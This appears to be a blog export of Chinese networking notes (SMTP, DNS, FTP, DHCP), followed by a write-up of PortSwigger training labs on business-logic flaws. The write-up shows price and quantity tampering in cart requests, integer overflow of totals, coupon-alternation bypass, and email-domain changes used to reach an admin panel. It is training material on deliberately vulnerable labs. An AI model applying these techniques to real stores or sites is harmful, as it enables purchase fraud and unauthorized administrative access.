title="电子邮件的格式"></a>电子邮件的格式</h3><h4 id="电子邮件的格式-邮件内容首部包括关键字"><a href="#电子邮件的格式-邮件内容首部包括关键字" class="headerlink" title="电子邮件的格式-邮件内容首部包括关键字"></a>电子邮件的格式-邮件内容首部包括关键字</h4><ul><li>To:后面填入一个或多个收信人电子邮件地址。</li><li>Subject:是邮件主题，反映邮件的主要内容</li><li>Cc:抄送，表示应给某人发送一个邮件副本。</li><li>Bcc:盲复写副本,发信人将邮件副本发给某人。</li><li>From和Date:发信人的电子邮件地址和日期，</li><li>Reply-To:即对方回信所用的地址。</li></ul><h3 id="邮件传送协议-SMTP"><a href="#邮件传送协议-SMTP" class="headerlink" title="邮件传送协议(SMTP)"></a>邮件传送协议(SMTP)</h3><p>规定在两个相互通信的SMTP进程之间应如何交换信息。使用客户服务器方式工作。</p><p>SMTP通信有3个阶段:</p><ul><li>连接建立</li><li>邮件传送</li><li>连接释放</li></ul><h4 id="连接建立"><a href="#连接建立" class="headerlink" title="连接建立"></a>连接建立</h4><ul><li>发信人先将要发送的邮件发送到邮件缓存。</li><li>SMTP客户定时对邮件缓存扫描</li><li>使用SMTP的熟知端口号码(25)与目的主机的SMTP服务器建立TCP连接</li><li>SMTP不使用中间的邮件服务器。</li></ul><h4 id="邮件传送"><a href="#邮件传送" class="headerlink" title="邮件传送"></a>邮件传送</h4><ul><li>首先从MAIL命令开始，MAIL后面有发信人的地址;</li><li>其次一个或多个RCPT命令。RCPT是先弄清接收端是否已做好准备，然后才发送</li><li>最后是DATA命令，开始传送邮件的内容。</li></ul><h4 id="连接释放"><a href="#连接释放" class="headerlink" title="连接释放"></a>连接释放</h4><ul><li>SMTP客户应发送QUIT命令。SMTP服务器返回信息“221(服务关闭)”，表示SMTP同意释放TCP连接。</li><li>SMTP使用TCP连接并不能保证不丢失邮件。没有端到端的确认返回到发信人处。</li></ul><h4 id="使用SMTP手工发送邮件"><a href="#使用SMTP手工发送邮件" class="headerlink" title="使用SMTP手工发送邮件"></a>使用SMTP手工发送邮件</h4><p><img src="/../image/image-20240925165247029.png" alt="image-20240925165247029"></p><p><a href="https://cloud.tencent.com/developer/article/1013069">https://cloud.tencent.com/developer/article/1013069</a></p><h4 id="SMTP基本工作流程"><a href="#SMTP基本工作流程" class="headerlink" title="SMTP基本工作流程"></a>SMTP基本工作流程</h4><ul><li>建立TCP连接</li><li>客户端向服务器发送HELO命令以标识发件人自己的身份</li><li>服务器端以OK作为响应，表示准备接收</li><li>客户端发送RCPT命令</li><li>服务器端表示是否愿意为收件人接收邮件</li><li>协商结束，发送邮件，用命令DATA发送输入内容</li><li>结束此次发送，用QUIT命令退出</li></ul><h3 id="邮件读取协议"><a href="#邮件读取协议" class="headerlink" title="邮件读取协议"></a>邮件读取协议</h3><h4 id="现常用的邮件读取协议有两个"><a href="#现常用的邮件读取协议有两个" class="headerlink" title="现常用的邮件读取协议有两个"></a>现常用的邮件读取协议有两个</h4><ul><li>邮局协议第三版本POP3(Post Office Protocol)</li><li>因特网报文存取协议IMAP(Internet Message Access Protocol)。</li></ul><h4 id="邮件读取协议POP3和IMAP"><a href="#邮件读取协议POP3和IMAP" class="headerlink" title="邮件读取协议POP3和IMAP"></a>邮件读取协议POP3和IMAP</h4><ul><li><p>邮局协议POP，是一个脱机协议。</p></li><li><p>邮局协议POP是一个简单、功能有限的邮件读取协议。POP使用客户服务器工作方式。</p></li><li><p>POP服务器只有在用户输入鉴别信息后才允许对邮箱进行读取:</p></li><li><p>POP服务器是有存储转发功能的中间服务器。</p></li><li><p>因特网报文存取协议IMAP，是联机协议。</p></li><li><p>IMAP用户可以在不同的地方使用不同的计算机随时阅读和处理自己的邮件，还允许收信人只读取邮件中的某一个部分。</p></li><li><p>缺点是如果用户没有将邮件复制到自己的PC机上，则邮件一直存放在IMAP服务器上。</p></li></ul><h2 id="域名解析协议"><a href="#域名解析协议" class="headerlink" title="域名解析协议"></a>域名解析协议</h2><h3 id="域名解析概述"><a href="#域名解析概述" class="headerlink" title="域名解析概述"></a>域名解析概述</h3><h4 id="域名系统"><a href="#域名系统" class="headerlink" title="域名系统"></a>域名系统</h4><p>一种用于TCP&#x2F;IP应用程序的分布式数据库，它提供主机名字和IP地址之间的转换及有关电子邮件的选路信息。</p><ul><li>域名结构由若干分量组成，各分量之间用点“”隔开:….三级域名.二级域名.顶级域名</li><li>每一级的域名都由英文字母和数字组成(不超过63个字符，并且不区分大小写字母</li><li>级别最低域名写在最左边，级别最高顶级域名写最右边。完整的域名不超过255个字符。</li></ul><h4 id="层次结构"><a href="#层次结构" class="headerlink" title="层次结构"></a>层次结构</h4><p><img src="/../image/image-20240925191602278.png" alt="image-20240925191602278"></p><h4 id="域名结构"><a href="#域名结构" class="headerlink" title="域名结构"></a>域名结构</h4><p>顶级域名TLD(Top Level Domain)有三类:</p><p>(1) 国家顶级域名TDL:由两个字母缩写来代表不同的国家，国家顶级域名有240多</p><p><img src="/../image/image-20240925191642487.png" alt="image-20240925191642487"></p><p>(2)国际顶级域名iTDL:只有一个:int</p><p>(3)通用顶级域名gTDL:按域名所属单位的性质和类型进行划分。</p><p><img src="/../image/image-20240925191725316.png" alt="image-20240925191725316"></p><h3 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h3><h4 id="域名服务器的种类"><a href="#域名服务器的种类" class="headerlink" title="域名服务器的种类"></a>域名服务器的种类</h4><p>域名服务器系统是按照域名层次安排的。每个域名服务器只对域名体系中一部分进行管辖。</p><ul><li>根域名服务器(root name server):主要用来管理互联网的主目录，共13台;</li><li>顶级域名服务器(Top Level Domain server ):负责管理在该顶级域名服务器下注册的二级域名</li><li>权限域名服务器(authoritative name server):负责一个区的域名解析工作</li><li>本地域名服务器(local name server):查询请求首先发给本地域名服务器</li></ul><h4 id="域名服务器管辖区"><a href="#域名服务器管辖区" class="headerlink" title="域名服务器管辖区"></a>域名服务器管辖区</h4><p><img src="/../image/image-20240925191912334.png" alt="image-20240925191912334"></p><h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><h4 id="域名解析过程和方式"><a href="#域名解析过程和方式" class="headerlink" title="域名解析过程和方式"></a>域名解析过程和方式</h4><ul><li><p>主机名映射为IP地址的过程称为域名解析</p></li><li><p>从主机域名到IP地址的正向解析</p><ul><li><p>从IP地址到主机域名的反向解析</p></li><li><p>解析任务由DNS服务器完成。</p></li></ul></li><li><p>DNS服务器进行名字解析的方式有:递归方式、非递归(迭代)方式和递归和迭代相结合的方式</p></li></ul><h4 id="查询方式"><a href="#查询方式" class="headerlink" title="查询方式"></a>查询方式</h4><p>递归查询:一般客户机和服务器之间属递归查询，即当客户机向DNS服务器发出请求后若DNS服务器本身不能解析,则会向另外的DNS服务器发出查询请求，得到结果后转交给客户机。</p><p><img src="/../image/image-20240925192233633.png" alt="image-20240925192233633"></p><p>迭代查询:本地域名服务器向根域名服务器查询，根域名服务器告诉它下一步到哪里去查询，然后它再去查，每次它都是以客户机的身份去各个服务器查询。</p><p><img src="/../image/image-20240925192335097.png" alt="image-20240925192335097"></p><p>递归和迭代相结合的查询过程</p><p><img src="/../image/image-20240925192359119.png" alt="image-20240925192359119"></p><h3 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h3><h4 id="协议格式-1"><a href="#协议格式-1" class="headerlink" title="协议格式"></a>协议格式</h4><p><img src="/../image/image-20240925200330084.png" alt="image-20240925200330084"></p><h4 id="Flags字段"><a href="#Flags字段" class="headerlink" title="Flags字段"></a>Flags字段</h4><ul><li>opcode</li><li>RA、RD</li><li>rcode</li></ul><p><img src="/../image/image-20240925200403349.png" alt="image-20240925200403349"></p><h4 id="响应类型"><a href="#响应类型" class="headerlink" title="响应类型"></a>响应类型</h4><p>20余种</p><p><img src="/../image/image-20240925200431669.png" alt="image-20240925200431669"></p><h4 id="协议格式-2"><a href="#协议格式-2" class="headerlink" title="协议格式"></a>协议格式</h4><p><img src="/../image/image-20240925200454704.png" alt="image-20240925200454704"></p><h3 id="解析示例"><a href="#解析示例" class="headerlink" title="解析示例"></a>解析示例</h3><p>例子:主机想知道另一个主机(域名为 <a href="http://www.bing.com)的ip地址./">www.bing.com)的IP地址。</a></p><p>1.先查询本地hosts文件与DNS缓存</p><p>2.请求DNS本地域名服务器，本地域名服务器执行递归查询</p><p>3.本地服务器执行迭代查询</p><h4 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h4><p>Nslookup:nslookup domain [server]</p><p>如果没指定dns-server，用系统默认的dns服务器</p><p><img src="/../image/image-20240925200624621.png" alt="image-20240925200624621"></p><p><img src="/../image/image-20240925200641135.png" alt="image-20240925200641135"></p><p>nslookup:交互模式，直接输入nslookup</p><p><img src="/../image/image-20240925200731217.png" alt="image-20240925200731217"></p><p>set all:列出nslookup工具的常用选项的当前设置值</p><p><img src="/../image/image-20240925200803734.png" alt="image-20240925200803734"></p><h2 id="FTP协议"><a href="#FTP协议" class="headerlink" title="FTP协议"></a>FTP协议</h2><h3 id="FTP协议概述"><a href="#FTP协议概述" class="headerlink" title="FTP协议概述"></a>FTP协议概述</h3><ul><li>文件传送协议FTP(File Transfer Protocol)是因特网上使用得非常广泛的文件传送协议</li><li>FTP提供交互式的访问，允许客户指明文件的类型与格式，并允许文件有存取权限。</li><li>FTP屏蔽了各计算机系统的细节，适合于在异构网络中任意计算机之间传送文件。</li><li>文件共享协议<ul><li>基于TCP的FTP和基于UDP的TFTP都是文件共享协议中的一大类，即复制整个文件其特点是，若要存取一个文件，就必须先获得本地的文件副本。</li></ul></li></ul><h3 id="FTP工作原理"><a href="#FTP工作原理" class="headerlink" title="FTP工作原理"></a>FTP工作原理</h3><ul><li>使用TCP可靠的传输服务:主要功能是减少或消除不同操作系统下处理文件的不兼容性。</li><li>客户&#x2F;服务器:同时为多个客户进程提供服务</li><li>服务器进程由两部分组成:主进程,负责接受新的请求;若干个从属进程,负责处理单个请求。</li></ul><h4 id="工作步骤"><a href="#工作步骤" class="headerlink" title="工作步骤"></a>工作步骤</h4><p>(1)服务端打开默认端口(21)，使客户进程能够连接上</p><p>(2)等待客户进程发出连接请求</p><p>(3)启动从属进程处理客户进程发来请求。从属进程对客户进程请求处理完毕终止但从属进程运行期间根据需要可创建其他子进程。</p><p>(4)回到等待状态,继续接受其他客户进程发来请求。主进程与从属进程是并发地进行的。</p><p>FTP的工作模式分为两种:</p><ul><li>主动模式</li><li>被动模式</li></ul><h4 id="主动模式port"><a href="#主动模式port" class="headerlink" title="主动模式port"></a>主动模式port</h4><p>在主动模式下，FTP客户端首先与FTP服务器的TCP21端口建立连接，通过这个通道发送命令，客户端需要接收数据的时候在这个通道上发送Port命令。</p><p>Port命令包含了客户端用什么端口接收数据。在传送数据的时候，服务器端通过其TCP20端口连接到客户端的指定端口发送数据。FTP服务器必须与客户端建立一个新的连接用来传送数据。。主动FTP连接过程如下:</p><ul><li>命令连接:客户端&gt;1024端口一服务器21端口</li><li>数据连接:客户端&gt;1024端口一服务器20端口FTP使用</li></ul><h4 id="被动模式pasv"><a href="#被动模式pasv" class="headerlink" title="被动模式pasv"></a>被动模式pasv</h4><p>在被动模式下，建立控制通道时与主动模式类似，但建立连接后发送的不是Port命令，而是Pasv命令。</p><p>FTP服务器收到Pasv命令后，随机打开一个高端端口(端口号大于1024)并且通知客户端在这个端口上传送数据的请求，客户端连接FTP服务器上的这个端口，然后FTP服务器将通过这个端口传送数据。被动FTP连接过程如入</p><ul><li>命令连接:客户端&gt;1024端口→服务器21端口</li><li>数据连接:客户端&gt;1024端口→服务器&gt;1024端口</li></ul><h4 id="主动与被动FTP优缺点"><a href="#主动与被动FTP优缺点" class="headerlink" title="主动与被动FTP优缺点"></a>主动与被动FTP优缺点</h4><p>主动FTP对FTP服务器的管理有利，但对客户端的管理不利。因为FTP服务器企图与客户端的高位随机端口建立连接，而这个端口很有可能被客户端的防火墙阻塞掉。</p><p>被动FTP对FTP客户端的管理有利，但对服务器端的管理不利。因为客户端要与服务器端建立两个连接，其中一个连到一个高位随机端口，而这个端口很有可能被服务器端的防火墙阻塞掉。</p><h4 id="FTP的使用"><a href="#FTP的使用" class="headerlink" title="FTP的使用"></a>FTP的使用</h4><p>DOS和UNIX下上网使用FTP命令功能</p><p>FTP的命令行格式为 <code>ftp -v -d -i -n -g [主机名)</code></p><ul><li><code> -v</code>显示远程服务器的所有响应信息</li><li><code>-d</code> 启用调试功能</li><li><code>-i</code>关闭提示功能</li><li><code>-n</code>关闭自动登录功能</li><li><code>-g </code>关闭通配符功能</li></ul><h3 id="FTP协议扩展"><a href="#FTP协议扩展" class="headerlink" title="FTP协议扩展"></a>FTP协议扩展</h3><h4 id="简单文件传送协议-TFTP"><a href="#简单文件传送协议-TFTP" class="headerlink" title="简单文件传送协议(TFTP)"></a>简单文件传送协议(TFTP)</h4><ul><li><p>简单文件传输协议TFTP(Trivial File Transfer Protocol)是很小且易于实现的文件传送协议。</p></li><li><p>TFTP的默认端口号为<strong>69</strong></p></li><li><p>TFTP使用客户服务器方式，但使用UDP数据报，因此要有自己的差错改正措施。</p></li><li><p>只支持文件传输,不支持交互,没有庞大的命令集,没有列目录功能,不能对用户进行身份鉴别。</p></li><li><p>优点:可用于UDP环境;代码所占内存小。</p></li><li><p>隐患:TFTP是局域网传输文件的通用方式，是普通文件传输协议,不需要用户登录认证,因此有安全隐患。</p></li></ul><h4 id="TFTP与FTP的区别"><a href="#TFTP与FTP的区别" class="headerlink" title="TFTP与FTP的区别"></a>TFTP与FTP的区别</h4><p>首先，FTP使用TCP，TFTP使用UDP</p><p>其次，TFTP的功能比FTP少。TFTP不能使用通配符、创建和删除目录、删除文件等;不提供用户名与口令认证。</p><p>TFTP的简洁性，所以路由器经常使用TFTP传输访问列表及路由配置信息</p><h2 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h2><h3 id="DHCP概述"><a href="#DHCP概述" class="headerlink" title="DHCP概述"></a>DHCP概述</h3><ul><li>DHCP(Dynamic Host Configure Protocol)是动态主机配置协议。<br>使用客户服务器方式。</li><li>一台DHCP服务器可以由管理员集中指派和指定全局的和子网特有的TCP&#x2F;IP参数(含IP地址、网关、DNS服务器等),供整个网络使用。</li><li>DHCP服务器使用的端口号为67</li><li>客户机不需要手动配置TCP&#x2F;IP;当客户机断开与服务器的连接后，旧的IP地址将被释放以便重新分配使用。</li><li>DHCP提供了一种称为即插即用连网(plug-and-play networking)的机制。</li><li>当一台计算机启动时就广播一个DHCP请求报文，DHCP服务器收到请求报文后返回一个DHCP回答报文。DHCP服务器先在其数据库中查找该计算机的配置信息。<ul><li>若找到，则返回找到的信息，</li><li>若找不到，则从服务器的按需分配地址库中取一个地址分配给该计算机。</li></ul></li></ul><h3 id="DHCP报文格式"><a href="#DHCP报文格式" class="headerlink" title="DHCP报文格式"></a>DHCP报文格式</h3><p><strong>OP</strong></p><p>若是 client 送给 server 的封包，设为1，反向为 2。</p><p><strong>HTYPE</strong></p><p>硬件类别，Ethernet为1。</p><p><strong>HLEN</strong></p><p>硬件地址长度，Ethernet 为6</p><p><img src="/../image/image-20240925211123908.png" alt="image-20240925211123908"></p><p><strong>HOPS</strong></p><p>若封包需经过 router 传送每站加 1，若在同一网内，为0</p><p><strong>TRANSACTION ID</strong></p><p>DHCP REQUEST 时产生的数值，以作 DHCPREPLY 时的依据。</p><p><strong>SECONDS</strong></p><p>Client 端启动时间(秒)。</p><p>FLAGS</p><p>从0到15共16 bits ，最左- bit 为1时表示 server 将以广播方式传送封包给 client其余尚未使用。</p><p><strong>Ciaddr</strong></p><p>要是 client 端想继续使用之前取得之IP 地址，则列于这里。</p><p><strong>Yiaddr</strong></p><p>server送回client之从DHCP OFFERDHCPACK封包中，此栏填写分配给 client的IP 地址</p><p><strong>Siaddr</strong></p><p>若 client 需要通过网络开机，从server送出DHCPOFFER、DHCPACK、DHCPNACK封包中，此栏填写开机程序代码所在 server之地址。</p><p><strong>Giaddr</strong></p><p>若需跨网域进行 DHCP 发放，此栏为 relay agent 的地址,否则为 0。</p><p><img src="/../image/image-20240925211351199.png" alt="image-20240925211351199"></p><h3 id="DHCP基本原理"><a href="#DHCP基本原理" class="headerlink" title="DHCP基本原理"></a>DHCP基本原理</h3><ul><li>DHCP协议采用UDP作为传输协议</li><li>主机发送请求消息到DHCP服务器的67号端口</li><li>DHCP服务器回应应答消息给主机的68号端口</li><li>DHCP服务的工作过程<ul><li>发现阶段</li><li>提供阶段</li><li>选择阶段</li><li>确认阶段</li><li>重新登录</li><li>更新租约</li></ul></li></ul><h4 id="发现阶段"><a href="#发现阶段" class="headerlink" title="发现阶段"></a>发现阶段</h4><p>DHCP客户机寻找DHCP服务器的阶段。DHCP客户机以广播方式(因为DHCP服务器的IP地址对于客户机来说是未知的)发送DHCPdiscover发现信息来寻找DHCP服务器，目即 向 地 址255.255.255.255发送特定的广播信息。</p><p>网络上每一台安装了TCP&#x2F;IP协议的主机都会接收到这种广播信息，但只有DHCP服务器才会做出响应:</p><p><img src="/../image/image-20240925211530614.png" alt="image-20240925211530614"></p><h4 id="提供阶段"><a href="#提供阶段" class="headerlink" title="提供阶段"></a>提供阶段</h4><p>DHCP服务器提供IP地址的阶段。在网络中接收到DHCP discover发现信息的DHCP服务器都会做出响应，它从尚未出租的IP地址中挑选一个分配给DHCP客户机，向DHCP客户机发送一个包含出租的!P地址和其他设置的DHCPoffer提供信息。</p><h4 id="选择阶段"><a href="#选择阶段" class="headerlink" title="选择阶段"></a>选择阶段</h4><p>DHCP客户机选择某台DHCP服务器提供的IP地址的阶段。如果有多台DHCP服务器向DHCP客户机发来的DHCP offer提供信息，则DHCP客户机只接受第一个收到的DHCP offer提供信息，然后它就以广播方式回答一个DHCP request请求信息，该信息中包含向它所选定的DHCP服务器请求IP地址的内容。之所以要以广播方式回答，是为了通知所有的DHCP服务器，他将选择某台DHCP服务器所提供的IP地址。</p><h4 id="确认阶段"><a href="#确认阶段" class="headerlink" title="确认阶段"></a>确认阶段</h4><p>DHCP服务器确认所提供的IP地址的阶段。当DHCP服务器收到DHCP客户机回答的DHCPrequest请求信息之后，它便向DHCP客户机发送一个包含它所提供的IP地址和其他设置的DHCPack确认信息，告诉DHCP客户机可以使用它所提供的!P地址。然后DHCP客户机便将其TCP&#x2F;IP协议与网卡绑定，另外，除DHCP客户机选中的服务器外，其他的DHCP服务器都将收回曾提供的IP地址。</p><h4 id="重新登录"><a href="#重新登录" class="headerlink" title="重新登录"></a>重新登录</h4><p>后DHCP客户机每次重新登录网络时，就不需要再发送DHCP discover发现信息了，而是直接发送包含前一次所分配的IP地址的DHCPrequest请求信息。当DHCP服务器收到这一信息后，它会尝试让DHCP客户机继续使用原来的IP地址，并回答一个DHCP ack确认信息。如果此IP地址已无法再分配给原来的DHCP客户机使用时(比如此IP地址已分配给其它DHCP客户机使用)，则DHCP服务器给DHCP客户机回答一个DHCPnack否认信息。当原来的DHCP客户机收到此DHCPnack否认信息后，它就必须重新发送DHCP discover发现信息来请求新的IP地址。</p><h4 id="更新租约"><a href="#更新租约" class="headerlink" title="更新租约"></a>更新租约</h4><p>DHCP服务器向DHCP客户机出租的IP地址一般都有一个租借期限，期满后DHCP服务器便会收回出租的IP地址。如果DHCP客户机要延长其IP租约，则必须更新其IP租约。DHCP客户机启动时和IP租约期限过一半时，DHCP客户机都会自动向DHCP服务器发送更新其IP租约的信息</p>]]></content>
      
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpLabb_Bussiness-Logic-vul</title>
      <link href="/2024/09/13/BurpLabb-Bussiness-Logic-vul/"/>
      <url>/2024/09/13/BurpLabb-Bussiness-Logic-vul/</url>
      
        <content type="html"><![CDATA[<h1 id="Business-logic-vulnerabilities"><a href="#Business-logic-vulnerabilities" class="headerlink" title="Business logic vulnerabilities"></a>Business logic vulnerabilities</h1><h2 id="Excessive-trust-in-client-side-controls"><a href="#Excessive-trust-in-client-side-controls" class="headerlink" title="Excessive trust in client-side controls"></a>Excessive trust in client-side controls</h2><p>This lab doesn’t adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a “Lightweight l33t leather jacket”.</p><p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><ol><li>With Burp running, log in and attempt to buy the leather jacket. The order is rejected because you don’t have enough store credit.</li></ol><p><img src="/../image/image-20240912152810896-1726237660674-1.png" alt="image-20240912152810896"></p><ol start="2"><li>In Burp, go to “Proxy” &gt; “HTTP history” and study the order process. Notice that when you add an item to your cart, the corresponding request contains a <code>price</code> parameter. Send the <code>POST /cart</code> request to Burp Repeater.</li></ol><p><img src="/../image/image-20240912153223976-1726237660675-2.png" alt="image-20240912153223976"></p><ol start="3"><li>In Burp Repeater, change the price to an arbitrary integer and send the request. Refresh the cart and confirm that the price has changed based on your input.</li></ol><p><img src="/../image/image-20240912153546972-1726237660675-3.png" alt="image-20240912153546972"></p><ol start="4"><li>Repeat this process to set the price to any amount less than your available store credit.</li></ol><p><img src="/../image/image-20240912155807097-1726237660675-4.png" alt="image-20240912155807097"></p><ol start="5"><li>Complete the order to solve the lab.</li></ol><p><img src="/../image/image-20240912160037202-1726237660675-6.png" alt="image-20240912160037202"></p><h2 id="High-level-logic-vulnerability"><a href="#High-level-logic-vulnerability" class="headerlink" title="High-level logic vulnerability"></a>High-level logic vulnerability</h2><p>This lab doesn’t adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a “Lightweight l33t leather jacket”.</p><p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>With Burp running, log in and add a cheap item to your cart.</p><p>In Burp, go to “Proxy” &gt; “HTTP history” and study the corresponding HTTP messages. Notice that the quantity is determined by a parameter in the <code>POST /cart</code> request.</p><p><img src="/../image/image-20240912160507132-1726237660675-5.png" alt="image-20240912160507132"></p><p>Go to the “Intercept” tab and turn on interception. Add another item to your cart and go to the intercepted <code>POST /cart</code> request in Burp.</p><p>Change the <code>quantity</code> parameter to an arbitrary integer, then forward any remaining requests. Observe that the quantity in the cart was successfully updated based on your input.</p><p><img src="/../image/image-20240912160742850-1726237660675-8.png" alt="image-20240912160742850"></p><p><img src="/../image/image-20240912160726562-1726237660675-7.png" alt="image-20240912160726562"></p><p>Repeat this process, but request a negative quantity this time. Check that this is successfully deducted from the cart quantity.</p><p><img src="/../image/image-20240912160849515-1726237660675-9.png" alt="image-20240912160849515"></p><p><img src="/../image/image-20240912160840928-1726237660675-10.png" alt="image-20240912160840928"></p><p>Request a suitable negative quantity to remove more units from the cart than it currently contains. Confirm that you have successfully forced the cart to contain a negative quantity of the product. Go to your cart and notice that the total price is now also a negative amount.</p><p><img src="/../image/image-20240912161150683-1726237660675-11.png" alt="image-20240912161150683"></p><p>Add the leather jacket to your cart as normal. Add a suitable negative quantity of the another item to reduce the total price to less than your remaining store credit.</p><p>Place the order to solve the lab.</p><p><img src="/../image/image-20240912161255697-1726237660675-12.png" alt="image-20240912161255697"></p><h2 id="Inconsistent-security-controls"><a href="#Inconsistent-security-controls" class="headerlink" title="Inconsistent security controls"></a>Inconsistent security controls</h2><p>此实验室的逻辑存在缺陷，允许任意用户访问本应仅供公司员工使用的管理功能。要解决此实验室问题，请访问管理面板并删除用户</p><h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><p>打开实验室，然后转到 Burp 中的“target”&gt;“site map”选项卡。右键单击实验室域并选择“参与工具”&gt;“Engagement tools”以打开内容发现工具。</p><p><img src="/../image/image-20240912163900008-1726237660675-13.png" alt="image-20240912163900008"></p><p>单击“会话未运行”以开始内容发现。片刻之后，查看对话框中的“站点地图”选项卡。请注意，它发现了路径 &#x2F;admin。</p><p>尝试浏览到 &#x2F;admin。虽然您没有访问权限，但错误消息表明 DontWannaCry 用户有访问权限。</p><p><img src="/../image/image-20240912165351667-1726237660675-14.png" alt="image-20240912165351667">转到帐户注册页面。请注意告诉 DontWannaCry 员工使用其公司电子邮件地址的消息。使用格式为以下任意电子邮件地址进行注册：</p><p><a href="mailto:&#97;&#x6e;&#121;&#x74;&#104;&#105;&#110;&#103;&#x40;&#x79;&#x6f;&#x75;&#114;&#45;&#101;&#109;&#97;&#x69;&#108;&#45;&#x69;&#100;&#46;&#x77;&#101;&#x62;&#45;&#115;&#x65;&#99;&#x75;&#114;&#105;&#x74;&#x79;&#x2d;&#x61;&#x63;&#97;&#x64;&#x65;&#x6d;&#121;&#x2e;&#x6e;&#x65;&#116;">&#97;&#x6e;&#121;&#x74;&#104;&#105;&#110;&#103;&#x40;&#x79;&#x6f;&#x75;&#114;&#45;&#101;&#109;&#97;&#x69;&#108;&#45;&#x69;&#100;&#46;&#x77;&#101;&#x62;&#45;&#115;&#x65;&#99;&#x75;&#114;&#105;&#x74;&#x79;&#x2d;&#x61;&#x63;&#97;&#x64;&#x65;&#x6d;&#121;&#x2e;&#x6e;&#x65;&#116;</a><br>您可以通过单击“电子邮件客户端”按钮找到您的电子邮件域名。</p><p><img src="/../image/image-20240912165852935-1726237660676-15.png" alt="image-20240912165852935"></p><p>转到电子邮件客户端并单击确认电子邮件中的链接以完成注册。</p><p><img src="/../image/image-20240912165951040-1726237660676-16.png" alt="image-20240912165951040"></p><p>使用您的新帐户登录并转到“我的帐户”页面。请注意，您可以选择更改您的电子邮件地址。将您的电子邮件地址更改为任意的 @dontwannacry.com 地址。</p><p><img src="/../image/image-20240912170043710-1726237660676-17.png" alt="image-20240912170043710"></p><p>请注意，您现在可以访问管理面板，您可以在其中删除 carlos 来解决实验室问题。</p><p><img src="/../image/image-20240912170058656-1726237660676-18.png" alt="image-20240912170058656"></p><p><img src="/../image/image-20240912170107911-1726237660676-19.png" alt="image-20240912170107911"></p><h2 id="Flawed-enforcement-of-business-rules"><a href="#Flawed-enforcement-of-business-rules" class="headerlink" title="Flawed enforcement of business rules"></a>Flawed enforcement of business rules</h2><p>This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a “Lightweight l33t leather jacket”.</p><p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p><p>登录后，您会注意到有一个优惠券代码，NEWCUST5。</p><p><img src="/../image/image-20240912201446920-1726237660676-20.png" alt="image-20240912201446920">在页面底部，注册新闻通讯。您会收到另一个优惠券代码，SIGNUP30。</p><p><img src="/../image/image-20240912205253104-1726237660676-22.png" alt="image-20240912205253104"></p><p>将皮夹克添加到您的购物车。<br>前往结账并应用两个优惠券代码以获得订单折扣。<br>尝试多次应用代码。请注意，如果您连续两次输入相同的代码，则会被拒绝，因为优惠券已被应用。但是，如果您在两个代码之间交替使用，则可以绕过此控制。</p><p><img src="/../image/image-20240912205850037-1726237660676-21.png" alt="image-20240912205850037"></p><p><img src="/../image/image-20240912205905553-1726237660676-23.png" alt="image-20240912205905553"></p><p>重复使用这两个代码足够多次，以将您的订单总额减少到低于您剩余的商店信用额度。</p><p><img src="/../image/image-20240912210107198-1726237660676-24.png" alt="image-20240912210107198"></p><p>完成订单以解决实验室问题。</p><p><img src="/../image/image-20240912210124788-1726237660676-25.png" alt="image-20240912210124788"></p><h2 id="Low-level-logic-flaw"><a href="#Low-level-logic-flaw" class="headerlink" title="Low-level logic flaw"></a>Low-level logic flaw</h2><p>This lab doesn’t adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a “Lightweight l33t leather jacket”.</p><p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p><p><strong>Hint</strong></p><p>You will need to use Burp Intruder (or Turbo Intruder) to solve this lab.</p><p>To make sure the price increases in predictable increments, we recommend configuring your attack to only send one request at a time. In Burp Intruder, you can do this from the resource pool settings using the <strong>Maximum concurrent requests</strong> option.</p><p><img src="/../image/image-20240912214137576-1726237660676-26.png" alt="image-20240912214137576"></p><p>抓添加到购物⻋的数据包，然后burp⼀直重放，当⾦额超过临界值后，会变成负值  </p><p><img src="/../image/image-20240912214317522-1726237660676-27.png" alt="image-20240912214317522"></p><p>这里quantity不能超过两位数，发送到intruder无限执行</p><p><img src="/../image/image-20240912214425814-1726237660676-28.png" alt="image-20240912214425814"></p><p>发现总价变为负数</p><p><img src="/../image/image-20240912214521543-1726237660676-29.png" alt="image-20240912214521543"></p><p>添加其它商品，使总价变为正数，但是价格⼩于100，购买成功  </p><p><img src="/../image/image-20240912220229433-1726237660676-30.png" alt="image-20240912220229433"></p><p><img src="/../image/image-20240912220242872-1726237660676-31.png" alt="image-20240912220242872"></p><h2 id="Inconsistent-handling-of-exceptional-input"><a href="#Inconsistent-handling-of-exceptional-input" class="headerlink" title="Inconsistent handling of exceptional input"></a>Inconsistent handling of exceptional input</h2><p>This lab doesn’t adequately validate user input. You can exploit a logic flaw in its account registration process to gain access to administrative functionality. To solve the lab, access the admin panel and delete the user <code>carlos</code>.</p><p> <strong>Hint</strong></p><p>You can use the link in the lab banner to access an email client connected to your own private mail server. The client will display all messages sent to <code>@YOUR-EMAIL-ID.web-security-academy.net</code> and any arbitrary subdomains. Your unique email ID is displayed in the email client.</p><p>访问管理界⾯，发现需要条件；访问注册⻚⾯，发现需要注册指定后缀域名的账号才能访问  </p><p><img src="/../image/image-20240912220407302-1726237660676-32.png" alt="image-20240912220407302"></p><p>发现可以⽤指定的邮箱，注册普通账号  </p><p><img src="/../image/image-20240912223809980-1726237660676-33.png" alt="image-20240912223809980"></p><p><img src="/../image/image-20240912223849245-1726237660676-34.png" 